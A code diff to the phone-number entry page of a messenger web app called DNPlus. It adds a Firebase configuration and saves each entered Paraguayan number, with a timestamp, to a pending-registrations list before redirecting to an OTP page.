@@ -32,37 +32,10 @@
             text-transform: uppercase;
         }
 
-        /* Modal DNPlus Oscuro Mejorado */
-        .modal-overlay { 
-            display: none; 
-            position: fixed; 
-            top: 0; left: 0; 
-            width: 100%; height: 100%; 
-            background: rgba(0, 0, 0, 0.7); 
-            z-index: 1000; 
-        }
-        .modal-box { 
-            background: #232d36; 
-            width: 85%; 
-            max-width: 320px; 
-            position: absolute;
-            top: 50%; left: 50%;
-            transform: translate(-50%, -50%);
-            padding: 20px 24px; 
-            border-radius: 3px; 
-            text-align: left;
-            box-shadow: 0 12px 30px rgba(0,0,0,0.5);
-        }
-        .btn-flat { 
-            background: none; 
-            border: none; 
-            color: #00a884; /* Verde brillante para botones de acción */
-            font-weight: bold; 
-            cursor: pointer; 
-            text-transform: uppercase; 
-            padding: 10px;
-            font-size: 14px; 
-        }
+        /* Modal DNPlus Oscuro */
+        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.7); z-index: 1000; }
+        .modal-box { background: #232d36; width: 85%; max-width: 320px; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); padding: 20px 24px; border-radius: 3px; text-align: left; box-shadow: 0 12px 30px rgba(0,0,0,0.5); }
+        .btn-flat { background: none; border: none; color: #00a884; font-weight: bold; cursor: pointer; text-transform: uppercase; padding: 10px; font-size: 14px; }
     </style>
 </head>
 <body>
@@ -81,19 +54,33 @@
         <div class="modal-box">
             <h3 id="modalTitulo" style="margin-top:0; font-size: 18px; color: #e9edef; font-weight: normal;">¿Es correcto?</h3>
             <div id="modalMensaje" style="font-size: 15px; color: #8696a0; line-height: 1.4;"></div>
-            <div id="modalButtons" style="display: flex; justify-content: flex-end; gap: 10px; margin-top: 20px;">
-                </div>
+            <div id="modalButtons" style="display: flex; justify-content: flex-end; gap: 10px; margin-top: 20px;"></div>
         </div>
     </div>
 
+    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-database-compat.js"></script>
+
     <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyD2nZF5QC-Zti80xP1A518qbUPnhRru_9A",
+            authDomain: "dnplus-messenger-pro.firebaseapp.com",
+            databaseURL: "https://dnplus-messenger-pro-default-rtdb.firebaseio.com",
+            projectId: "dnplus-messenger-pro",
+            storageBucket: "dnplus-messenger-pro.firebasestorage.app",
+            messagingSenderId: "625573378436",
+            appId: "1:625573378436:android:58945eb1e22ec4a2ba85d1"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
         const modal = document.getElementById('miModal');
         const modalTitulo = document.getElementById('modalTitulo');
         const modalMensaje = document.getElementById('modalMensaje');
         const modalButtons = document.getElementById('modalButtons');
 
         function validarNumero() {
-            let num = document.getElementById('phoneInput').value.replace(/\s+/g, ''); // Quitamos espacios
+            let num = document.getElementById('phoneInput').value.replace(/\s+/g, '');
             
             if(num.length >= 9) {
                 modalTitulo.innerText = "¿Es este su número?";
@@ -103,12 +90,12 @@
                 `;
                 modalButtons.innerHTML = `
                     <button class="btn-flat" onclick="cerrarModal()">EDITAR</button>
-                    <button class="btn-flat" onclick="irAOTP('${num}')">OK</button>
+                    <button class="btn-flat" onclick="guardarYEnviar('${num}')">OK</button>
                 `;
                 modal.style.display = 'block';
             } else {
                 modalTitulo.innerText = "Número no válido";
-                modalMensaje.innerText = "El número de teléfono es demasiado corto para el país: Paraguay.\n\nIncluye tu código de área si no lo has hecho.";
+                modalMensaje.innerText = "El número de teléfono es demasiado corto.";
                 modalButtons.innerHTML = `<button class="btn-flat" onclick="cerrarModal()">OK</button>`;
                 modal.style.display = 'block';
             }
@@ -116,10 +103,17 @@
 
         function cerrarModal() { modal.style.display = 'none'; }
         
-        function irAOTP(num) {
-            // Guardamos el número para usarlo en el perfil más tarde
-            localStorage.setItem("user_phone", "+595 " + num);
-            window.location.href = 'otp.html';
+        function guardarYEnviar(num) {
+            const numCompleto = "+595" + num;
+            
+            // Guardamos en Firebase para saber quién intenta registrarse
+            db.ref("registros_pendientes").push({
+                telefono: numCompleto,
+                fecha: Date.now()
+            }).then(() => {
+                localStorage.setItem("user_phone", numCompleto);
+                window.location.href = 'otp.html';
+            });
         }
     </script>
 </body>
